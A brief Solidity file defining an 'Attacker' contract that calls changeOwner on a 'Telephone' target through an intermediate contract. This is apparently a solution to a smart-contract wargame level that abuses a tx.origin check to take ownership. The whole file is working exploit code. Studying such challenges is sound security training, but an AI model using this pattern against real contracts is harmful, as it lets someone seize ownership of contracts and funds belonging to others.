// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {

  function changeOwner(address _owner) external;
}

contract Attacker {
    ITelephone immutable telephone;
    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}